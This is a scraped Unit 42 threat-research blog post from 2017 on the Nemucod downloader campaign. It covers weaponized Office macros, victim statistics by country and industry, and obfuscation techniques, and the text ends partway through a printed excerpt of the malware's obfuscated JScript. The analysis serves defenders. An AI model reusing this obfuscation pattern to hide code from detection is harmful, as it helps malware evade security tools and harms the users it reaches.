<path d="M137.769 3.63998C136.502 3.63998 135.539 4.60293 135.539 5.87067C135.539 7.13842 136.502 8.10137 137.769 8.10137C139.037 8.10137 140 7.13842 140 5.87067C140 4.60293 139.037 3.63998 137.769 3.63998ZM137.769 7.79554C136.666 7.79554 135.867 6.99687 135.867 5.86964C135.867 4.74241 136.666 3.94375 137.769 3.94375C138.873 3.94375 139.671 4.74241 139.671 5.86964C139.671 6.99687 138.873 7.79554 137.769 7.79554Z" fill="white"/>
<path d="M108.416 0H104.307V18.7857H108.416V0Z" fill="white"/>
<path d="M116.518 15.6159C115.321 15.6159 114.874 15.029 114.874 13.7613V8.10137H119.712V4.93149H114.874V1.76058L110.765 2.37121V14.159C110.765 17.3765 112.409 19.0203 115.697 19.0203C117.153 19.0203 118.867 18.5739 120.276 17.7753L119.102 14.8637C118.279 15.31 117.129 15.6159 116.518 15.6159Z" fill="white"/>
<path d="M95.6662 4.69592C93.8581 4.69592 91.9797 5.18876 89.655 6.43377L90.9465 9.62741C92.9654 8.50019 94.633 8.00735 95.8542 8.00735C97.2397 8.00735 97.8504 8.52395 97.8504 9.20483V9.25133C97.8504 9.72143 97.4743 9.97974 96.5589 10.0738L94.9626 10.238C90.9702 10.6606 89.3264 12.3985 89.3264 14.7934V14.9577C89.3264 17.2359 91.2048 19.0203 93.8581 19.0203C95.6042 19.0203 97.123 18.2826 98.0456 16.9807L98.3432 18.7857H101.959V10.5904C101.959 6.71584 99.7287 4.69592 95.6662 4.69592ZM95.3138 15.8969C93.9748 15.8969 93.3415 15.3803 93.3415 14.5816V14.5351C93.3415 13.8305 93.7403 13.3139 95.1961 13.1031L95.8304 13.0091C96.7572 12.8799 97.3265 12.7095 97.8493 12.3923V13.4317C97.8493 15.0052 96.8637 15.8969 95.3138 15.8969Z" fill="white"/>
<path d="M81.225 4.69592C77.022 4.69592 74.0629 7.6075 74.0629 11.6236V12.0937C74.0629 16.1087 77.022 19.0213 81.225 19.0213C85.4281 19.0213 88.3872 16.1097 88.3872 12.0937V11.6236C88.3862 7.60853 85.4281 4.69592 81.225 4.69592ZM84.1593 11.9759C84.1593 14.0888 83.0559 15.6159 81.224 15.6159C79.3921 15.6159 78.2887 14.0898 78.2887 11.9759V11.7414C78.2887 9.62741 79.3921 8.10137 81.224 8.10137C83.0559 8.10137 84.1593 9.62741 84.1593 11.7414V11.9759Z" fill="white"/>
<path d="M98.0446 22.1168H99.0975L100.551 24.0334H100.566V22.1168H101.532V25.4964H100.513L99.0251 23.5313H99.0107V25.4964H98.0446V22.1168Z" fill="white"/>
<path d="M102.816 22.1168H105.771L105.81 22.9372H103.825V23.4011H105.385V24.1491H103.825V24.676H105.868L105.829 25.4964H102.816V22.1168Z" fill="white"/>
<path d="M107.925 22.9857H106.742L106.78 22.1168H110.088L110.127 22.9857H108.944V25.4964H107.925V22.9857Z" fill="white"/>
<path d="M110.943 22.1168H112.024L112.575 24.4632H112.628L113.342 22.1168H114.333L115.033 24.4632H115.086L115.627 22.1168H116.66L115.771 25.4964H114.444L113.826 23.4589H113.797L113.169 25.4964H111.836L110.943 22.1168Z" fill="white"/>
<path d="M117.404 23.8071C117.404 22.7057 118.152 22.0155 119.335 22.0155C120.518 22.0155 121.267 22.7057 121.267 23.8071C121.267 24.9085 120.519 25.5987 119.335 25.5987C118.152 25.5987 117.404 24.9075 117.404 23.8071ZM120.257 23.8071C120.257 23.2234 119.92 22.8752 119.335 22.8752C118.75 22.8752 118.412 23.2234 118.412 23.8071C118.412 24.3919 118.75 24.7391 119.33 24.7391C119.914 24.7391 120.257 24.3909 120.257 23.8071Z" fill="white"/>
<path d="M122.363 22.1168H124.334C125.231 22.1168 125.672 22.5414 125.672 23.3287C125.672 23.8691 125.449 24.2369 125.014 24.4105L125.816 25.4974H124.667L124.044 24.6089H123.378V25.4974H122.363V22.1168ZM124.202 23.8164C124.54 23.8164 124.661 23.6284 124.661 23.3721C124.661 23.1159 124.54 22.933 124.202 22.933H123.377V23.8164H124.202Z" fill="white"/>
<path d="M126.989 22.1168H128.002V23.3628H128.418L129.408 22.1168H130.547L130.552 22.1209L129.259 23.7389L130.625 25.4923L130.62 25.4964H129.437L128.414 24.1977H128.002V25.4964H126.989V22.1168Z" fill="white"/>
<path d="M131.402 25.2743V24.3475H131.407C131.972 24.6327 132.523 24.7721 133 24.7721C133.363 24.7721 133.546 24.6853 133.546 24.5159C133.546 24.3465 133.425 24.3031 132.7 24.1873C131.909 24.0623 131.382 23.8247 131.382 23.1438C131.382 22.5115 131.938 22.0238 133.024 22.0238C133.459 22.0238 133.912 22.1158 134.333 22.2945V23.212L134.328 23.2172C133.927 22.9857 133.386 22.84 132.951 22.84C132.565 22.84 132.411 22.932 132.411 23.0859C132.411 23.2843 132.648 23.3029 133.242 23.4052C134.033 23.5406 134.56 23.7627 134.56 24.4777C134.56 25.0325 134.145 25.5884 132.952 25.5884C132.364 25.5884 131.894 25.4675 131.402 25.2743Z" fill="white"/>
</svg>

</a>

      </div>

      <div class="col-sm-auto col-6 text-sm-center order-sm-2 order-4 second-logo-unit">
        <a href="https://unit42.paloaltonetworks.com/"><img src="/wp-content/uploads/2019/07/unit42.svg" class="attachment-full size-full" alt="" height="35" width="105" /></a>
      </div>

      <div class="col-auto d-sm-none ml-auto mb-40 order-2">
        <button class="btn__search" data-toggle="collapse" data-target="#search"><i class="ui ui-1"></i></button>
      </div>

      <div id="search" class="collapse d-sm-block col-sm-auto col-12 ml-auto order-3">
        <div class="pt-sm-0 pt-20 pb-sm-0 pb-40 mt-sm-0 mt-n30">
                      <input type="search" placeholder="Search Unit 42" id="innerSearch" class="header__search" value="" required>
                  </div>
      </div>

      <div class="col-auto d-sm-none d-flex ml-auto align-items-center order-5">
        <button class="btn__menu rounded" data-toggle="collapse" data-target="#navigation">Menu</button>
      </div>
    </div>
  </div>
</header>

<nav id="navigation" class="site-nav collapse d-sm-block pb-20 mt-sm-10">
  <div class="container px-sm-30">
    <ul id="menu-primary-navigation" class="main-menu d-sm-flex font-weight-medium"><li id="menu-item-97290" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-97290"><a href="https://unit42.paloaltonetworks.com/tools/">Tools</a></li>
<li id="menu-item-41" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-41"><a href="https://unit42.paloaltonetworks.com/atoms/">ATOMs</a></li>
<li id="menu-item-98931" class="menu-item menu-item-type-post_type_archive menu-item-object-events menu-item-98931"><a href="https://unit42.paloaltonetworks.com/events/">Speaking Events</a></li>
<li id="menu-item-81229" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-81229"><a href="https://unit42.paloaltonetworks.com/about-unit-42/">About Us</a></li>
</ul>  </div>
</nav>

  <article class="article overflow-hidden">
    
<header class="article__header py-sm-25 pt-40 pb-25 bg-gray-700">
  <div class="container">
    
    <h1 class="article__header__title mb-sm-30 mb-40">Practice Makes Perfect: Nemucod Evolves Delivery and Obfuscation Techniques to Harvest Credentials</h1>

    <ul class="article__entry-meta d-flex flex-wrap align-items-center text-black">
      <li class="mr-10 mb-10 px-20 rounded-pill d-flex bg-gray-200"><div class="post-views post-29312 entry-meta">
			
			
			<span class="post-views-count">21,168</span>
			</div> <span class="ml-5">people reacted</span></li>
      <li class="d-sm-none col-12 p-0"></li>
      <li class="mr-10 mb-10 px-20 rounded-pill bg-gray-200"><span class="ldc-ul_cont idc_ul_cont_not_liked_inner" onclick="alter_ul_post_values(this,'29312','like')"><i class="ui ui-2"></i><span class="ml-5">0</span></span></li>
      <li class="mb-10 px-20 rounded-pill bg-gray-200"><span class="span-reading-time rt-reading-time"><span class="rt-label rt-prefix"></span> <span class="rt-time"> 25</span> <span class="rt-label rt-postfix"></span></span> min. read</li>
    </ul>

    <div class="article__share position-relative">
      <div class="dropdown dropdown-right">
        <button type="button" class="px-25 text-black bg-white text-uppercase rounded-pill" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Share <i class="ui ui-6 ml-10 align-text-top"></i>
        </button>
        <div class="dropdown-menu rounded-pill" role="toolbar">
          <div class="share-dropdown px-20 py-10 text-black font-size-sm">
            <div class="row align-items-center flex-nowrap">
              <div class="col">
                <div class="d-flex align-items-center">
                  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-practice-makes-perfect-nemucod-evolves-delivery-obfuscation-techniques-harvest-credentials%2F" target="_blank"><i class="ui ui-7"></i></a>
                  <a href="https://twitter.com/home?status=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-practice-makes-perfect-nemucod-evolves-delivery-obfuscation-techniques-harvest-credentials%2F+-+Practice+Makes+Perfect%3A+Nemucod+Evolves+Delivery+and+Obfuscation+Techniques+to+Harvest+Credentials" target="_blank"><i class="ui ui-8"></i></a>
                  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-practice-makes-perfect-nemucod-evolves-delivery-obfuscation-techniques-harvest-credentials%2F&title=Practice+Makes+Perfect%3A+Nemucod+Evolves+Delivery+and+Obfuscation+Techniques+to+Harvest+Credentials&summary=&source=" target="_blank"><i class="ui ui-9"></i></a>
                  <a href="//www.reddit.com/submit?url=https://unit42.paloaltonetworks.com/unit42-practice-makes-perfect-nemucod-evolves-delivery-obfuscation-techniques-harvest-credentials/" target="_blank"><i class="ui ui-10"></i></a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</header>    <div class="article__summary py-25 text-gray-500 font-size-sm">
  <div class="container">
    <div class="row align-items-center no-gutters">
      <div class="col-sm-auto col-12 mb-sm-0 mb-35">
        <i class="ui ui-11 text-gray-700 mr-sm-20"></i>
      </div>
  
      <div class="col-sm col-12">
        <p>
          By <a href="https://unit42.paloaltonetworks.com/author/alex-hinchliffe/" title="Posts by Alex Hinchliffe" class="author url fn" rel="author">Alex Hinchliffe</a>        </p>
        <p><time datetime="2017-05-11T11:00:48+00:00">May 11, 2017 at 4:00 AM</time></p>
        <p>Category: <a href="https://unit42.paloaltonetworks.com/category/unit42/" rel="category tag">Unit 42</a></p>
        <p>Tags: <a href="https://unit42.paloaltonetworks.com/tag/autofocus/" rel="tag">AutoFocus</a>, <a href="https://unit42.paloaltonetworks.com/tag/credential-theft/" rel="tag">credential theft</a>, <a href="https://unit42.paloaltonetworks.com/tag/encoded-javascript/" rel="tag">Encoded JavaScript</a>, <a href="https://unit42.paloaltonetworks.com/tag/grizzly-steppe/" rel="tag">Grizzly Steppe</a>, <a href="https://unit42.paloaltonetworks.com/tag/jse/" rel="tag">JSE</a>, <a href="https://unit42.paloaltonetworks.com/tag/macro/" rel="tag">Macro</a>, <a href="https://unit42.paloaltonetworks.com/tag/nemucod/" rel="tag">Nemucod</a>, <a href="https://unit42.paloaltonetworks.com/tag/scripting/" rel="tag">scripting</a>, <a href="https://unit42.paloaltonetworks.com/tag/unit-42/" rel="tag">Unit 42</a></p>
      </div>
    </div>
  </div>
</div>    <div class="py-30 bg-white">
      <div class="container">
        <div class="article__content pb-30">
                      <figure class="mb-30 text-center">
              <img width="650" height="300" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" class="attachment-single size-single wp-post-image" alt="" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg 650w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300-300x138.jpg 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300-370x171.jpg 370w" sizes="(max-width: 650px) 100vw, 650px" />            </figure>
                    <p class="wpml-ls-statics-post_translations wpml-ls">This post is also available in: 
    <span class="wpml-ls-slot-post_translations wpml-ls-item wpml-ls-item-ja wpml-ls-first-item wpml-ls-last-item wpml-ls-item-legacy-post-translations"><a href="https://unit42.paloaltonetworks.jp/unit42-practice-makes-perfect-nemucod-evolves-delivery-obfuscation-techniques-harvest-credentials/" class="wpml-ls-link"><span class="wpml-ls-native" lang="ja"></span><span class="wpml-ls-display"><span class="wpml-ls-bracket"> (</span>Japanese<span class="wpml-ls-bracket">)</span></span></a></span></p><p>Recently the Unit 42 research team have been investigating a wave of <a href="http://researchcenter.paloaltonetworks.com/tag/nemucod/">Nemucod</a> downloader malware that uses weaponized documents to deploy encoded, and heavily obfuscated JavaScript, ultimately leading to further payloads being delivered to the victim. From a single instance of the encoded JavaScript discovered in one version of this malware, we pivoted on the Command and Control (C2) IPv4 address discovered during static analysis and deobfuscation, using our Threat Intelligence Service AutoFocus, unearthed many more versions of the malware and found that the versions seen to date were delivering a credential-stealing Trojan as the final payload.</p>
<p>In our recently published <a href="https://www.paloaltonetworks.com/content/pan/en_US/resources/research/unit-42-credential-based-attacks.html">Unit 42 white paper Credential-Based Attacks</a> we describe the importance of credentials to attackers, how they are stolen using techniques including malspam phishing as per this Nemucod campaign that delivers a credential stealing Trojan, as well as how the stolen credentials are used by the attackers to masquerade as legitimate users.</p>
<p>Over the past five months we have tracked this campaign of Nemucod malware in various industry sectors across multiple countries with Europe amassing the highest number of attacks, followed by the United States of America and then Japan (as can be seen in Figure 1).</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_1.png" rel="wpdevart_lightbox"><img class="alignnone wp-image-30131" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_1.png" alt="nemucod_1" width="562" height="300" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_1.png 852w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_1-300x160.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_1-768x410.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_1-370x198.png 370w" sizes="(max-width: 562px) 100vw, 562px" /></a></p>
<p>Figure 1: Nemucod Destination Countries by session volume.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_2.png" rel="wpdevart_lightbox"><img class="alignnone wp-image-30107" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_2.png" alt="nemucod_2" width="559" height="300" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_2.png 838w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_2-300x161.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_2-768x412.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_2-370x199.png 370w" sizes="(max-width: 559px) 100vw, 559px" /></a></p>
<p>Figure 2: Target Industries by session volume.</p>
<p>Spain was the single most affected country, as shown in Figure 1, with the Professional and Legal Services sector, as shown in Figure 2, contributing the most towards that and also towards Belgiums total volume as well. Utilities was next, almost exclusively in France; Healthcare was primarily made up again from volume seen in Spain; Energy, towards the end of the list of Top 10 industries shown in Figure 3, was mostly due to activity in the United Kingdom; the Securities and Investments sector was mostly made up from traffic in the United States of America, United Kingdom and Norway. Malicious traffic seen in Japan was due to attacks seen in High Tech industries.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_3.png" rel="wpdevart_lightbox"><img class="alignnone wp-image-30083" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_3.png" alt="nemucod_3" width="326" height="300" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_3.png 463w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_3-300x276.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_3-370x340.png 370w" sizes="(max-width: 326px) 100vw, 326px" /></a></p>
<p>Figure 3: European Countries by session volume.</p>
<p>Much of the malware arrived by email (using SMTP, POP3 and IMAP applications) as shown in Figure 4, the vast majority of which originated from Poland or at least using source email addresses with Polish domain names. Recipient email addresses varied but many seem valid based on names and linked-in account details. A small proportion of the sessions seen were over the web-browsing application being downloaded from websites resolving to IP addresses in Moldova, which will be discussed in more detail later.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_4.png" rel="wpdevart_lightbox"><img class="alignnone wp-image-30059" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_4.png" alt="nemucod_4" width="555" height="300" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_4.png 679w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_4-300x162.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_4-370x200.png 370w" sizes="(max-width: 555px) 100vw, 555px" /></a></p>
<p>Figure 4: Nemucod network application by session volume</p>
<p>The remainder of this blog describes the evolution of the malware since that time, as well as other topics:</p>
<ul>
<li>Weaponized document evolution.</li>
<li>Insight into the possible workflow and setup of the attackers, including their infrastructure.</li>
<li>Obfuscation and social engineering techniques used.</li>
<li>The credential theft payload.</li>
</ul>
<h3><span lang="EN-GB">Technical Analysis</span></h3>
<p><strong>Dropper Evolution</strong></p>
<p>Apart from a brief period of time in January 2017, when the actors delivered the encoded JScript content via Delphi-compiled dropper executable files, we have primarily observed only weaponized documents using Microsoft Office Macros using Visual Basic for Applications (VBA) code to install Nemucod. Its hard to know why the attackers changed briefly from using weaponized documents to using executable files and then switched back again, especially considering the volume of documents carrying malware nowadays. Perhaps they were testing their own or their targets capabilities.</p>
<p>In total Unit 42 has seen over 50 versions of these weaponized documents spanning from late October through to March. Weve used these to lay out a timeline, which will be referenced throughout the remainder of this blog, of the milestones of evolution that provides some insight into why the changes are made. Note: This figure does not cover all versions seen but simply milestone changes. It does however start with the first version created on October 23<sup>rd</sup>, last saved 25<sup>th</sup> October and first seen by our Wildfire cloud sandbox 26<sup>th</sup> October.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_5.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-30035" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_5.png" alt="nemucod_5" width="1181" height="515" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_5.png 1181w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_5-900x392.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_5-300x131.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_5-768x335.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_5-1024x447.png 1024w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_5-370x161.png 370w" sizes="(max-width: 1181px) 100vw, 1181px" /></a></p>
<p>Figure 5: Timeline showing evolution of Nemucod weaponized documents.</p>
<p>Common throughout all versions of the weaponized document droppers is password-protected VBA code, as shown in Figure 6 below. The attackers use this to hinder researcher analysis and perhaps to give the document more legitimacy for those people, or security solutions, looking at such properties.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_6.png" rel="wpdevart_lightbox"><img class="alignnone wp-image-30011" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_6.png" alt="nemucod_6" width="599" height="300" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_6.png 729w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_6-300x150.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_6-370x185.png 370w" sizes="(max-width: 599px) 100vw, 599px" /></a></p>
<p>Figure 6: Password-protected VBA editor to protect code</p>
<p>Also common to all versions is the use of a heavily obfuscated JScript payload, an excerpt of which is shown in Figure 7. The obfuscation makes use of variable names that are seemingly randomly generated, extensive use of Unicode character encoding (e.g. \u00xx) where xx is the ASCII character code representation, and the use of generally unnecessary arithmetic to piece together sub-strings or select characters from strings. Such obfuscation is primarily to avoid signature-based detection technologies but has little to no effect on dynamic analysis sandbox systems, such as Wildfire. It does however cause some headaches and delays during manual analysis.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f69287a8ace2139088103" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
 esesop_famous4='symbol';esesop_However7='breaking';esesop_pillar7='Paolo';esesop_pretends='Leading';esesop_comfortable='quattrocento1';esesop_PABLO='artistic10';esesop_Raphael7='Durer5';esesop_Picasso='demonstrates';esesop_clearly5='between';esesop_TURNER5='being3';esesop_famous8='renewal';esesop_often1='expressionism';esesop_Abstract7='MARCEL8';esesop_above='loose7';esesop_many1='years';esesop_courtesan='modernism10';esesop_with='FRIDA';esesop_JACKSON='romanticism';esesop_Sistine='Quattrocento';var esesop_considered=this[[''+String[{p0:'\u0066'}.p0+{p0:'\u0072'}.p0+{p1:'\u006f'}.p1+{p_t1:'\u006d'}.p_t1+{p_s0:'\u0043'}.p_s0+{p_1:'\u0068'}.p_1+{p_l0:'\u0061'}.p_l0+{p0:'\u0072'}.p0+{p3:'\u0043'}.p3+{p_1:'\u006f'}.p_1+{p_f2:'\u0064'}.p_f2+{p_h2:'\u0065'}.p_h2](Math[{p_3:'\u006d'}.p_3+{p_M2:'\u0061'}.p_M2+{p3:'\u0078'}.p3](87,[]))+'',</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f69287a8ace2139088103-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f69287a8ace2139088103-1"><span class="crayon-h"> </span><span class="crayon-v">esesop_famous4</span><span class="crayon-o">=</span><span class="crayon-s">'symbol'</span><span class="crayon-sy">;</span><span class="crayon-v">esesop_However7</span><span class="crayon-o">=</span><span class="crayon-s">'breaking'</span><span class="crayon-sy">;</span><span class="crayon-v">esesop_pillar7</span><span class="crayon-o">=</span><span class="crayon-s">'Paolo'</span><span class="crayon-sy">;</span><span class="crayon-v">esesop_pretends</span><span class="crayon-o">=</span><span class="crayon-s">'Leading'</span><span class="crayon-sy">;</span><span class="crayon-v">esesop_comfortable</span><span class="crayon-o">=</span><span class="crayon-s">'quattrocento1'</span><span class="crayon-sy">;</span><span class="crayon-v">esesop_PABLO</span><span class="crayon-o">=</span><span class="crayon-s">'artistic10'</span><span class="crayon-sy">;</span><span class="crayon-v">esesop_Raphael7</span><span class="crayon-o">=</span><span class="crayon-s">'Durer5'</span><span class="crayon-sy">;</span><span class="crayon-v">esesop_Picasso</span><span class="crayon-o">=</span><span class="crayon-s">'demonstrates'</span><span class="crayon-sy">;</span><span class="crayon-v">esesop_clearly5</span><span class="crayon-o">=</span><span class="crayon-s">'between'</span><span class="crayon-sy">;</span><span class="crayon-v">esesop_TURNER5</span><span class="crayon-o">=</span><span class="crayon-s">'being3'</span><span class="crayon-sy">;</span><span class="crayon-v">esesop_famous8</span><span class="crayon-o">=</span><span class="crayon-s">'renewal'</span><span class="crayon-sy">;</span><span class="crayon-v">esesop_often1</span><span class="crayon-o">=</span><span class="crayon-s">'expressionism'</span><span class="crayon-sy">;</span><span class="crayon-v">esesop_Abstract7</span><span class="crayon-o">=</span><span class="crayon-s">'MARCEL8'</span><span class="crayon-sy">;</span><span class="crayon-v">esesop_above</span><span class="crayon-o">=</span><span class="crayon-s">'loose7'</span><span class="crayon-sy">;</span><span class="crayon-v">esesop_many1</span><span class="crayon-o">=</span><span class="crayon-s">'years'</span><span class="crayon-sy">;</span><span class="crayon-v">esesop_courtesan</span><span class="crayon-o">=</span><span class="crayon-s">'modernism10'</span><span class="crayon-sy">;</span><span class="crayon-v">esesop_with</span><span class="crayon-o">=</span><span class="crayon-s">'FRIDA'</span><span class="crayon-sy">;</span><span class="crayon-v">esesop_JACKSON</span><span class="crayon-o">=</span><span class="crayon-s">'romanticism'</span><span class="crayon-sy">;</span><span class="crayon-v">esesop_Sistine</span><span class="crayon-o">=</span><span class="crayon-s">'Quattrocento'</span><span class="crayon-sy">;</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">esesop_considered</span><span class="crayon-o">=</span><span class="crayon-r">this</span><span class="crayon-sy">[</span><span class="crayon-sy">[</span><span class="crayon-s">''</span><span class="crayon-o">+</span><span class="crayon-t">String</span><span class="crayon-sy">[</span><span class="crayon-sy">{</span><span class="crayon-v">p0</span><span class="crayon-o">:</span><span class="crayon-s">'\u0066'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">p0</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">p0</span><span class="crayon-o">:</span><span class="crayon-s">'\u0072'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">p0</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">p1</span><span class="crayon-o">:</span><span class="crayon-s">'\u006f'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">p1</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">p_t1</span><span class="crayon-o">:</span><span class="crayon-s">'\u006d'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">p_t1</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">p_s0</span><span class="crayon-o">:</span><span class="crayon-s">'\u0043'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">p_s0</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">p_1</span><span class="crayon-o">:</span><span class="crayon-s">'\u0068'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">p_1</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">p_l0</span><span class="crayon-o">:</span><span class="crayon-s">'\u0061'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">p_l0</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">p0</span><span class="crayon-o">:</span><span class="crayon-s">'\u0072'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">p0</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">p3</span><span class="crayon-o">:</span><span class="crayon-s">'\u0043'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">p3</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">p_1</span><span class="crayon-o">:</span><span class="crayon-s">'\u006f'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">p_1</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">p_f2</span><span class="crayon-o">:</span><span class="crayon-s">'\u0064'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">p_f2</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">p_h2</span><span class="crayon-o">:</span><span class="crayon-s">'\u0065'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">p_h2</span><span class="crayon-sy">]</span><span class="crayon-sy">(</span><span class="crayon-e">Math</span><span class="crayon-sy">[</span><span class="crayon-sy">{</span><span class="crayon-v">p_3</span><span class="crayon-o">:</span><span class="crayon-s">'\u006d'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">p_3</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">p_M2</span><span class="crayon-o">:</span><span class="crayon-s">'\u0061'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">p_M2</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">p3</span><span class="crayon-o">:</span><span class="crayon-s">'\u0078'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">p3</span><span class="crayon-sy">]</span><span class="crayon-sy">(</span><span class="crayon-cn">87</span><span class="crayon-sy">,</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-o">+</span><span class="crayon-s">''</span><span 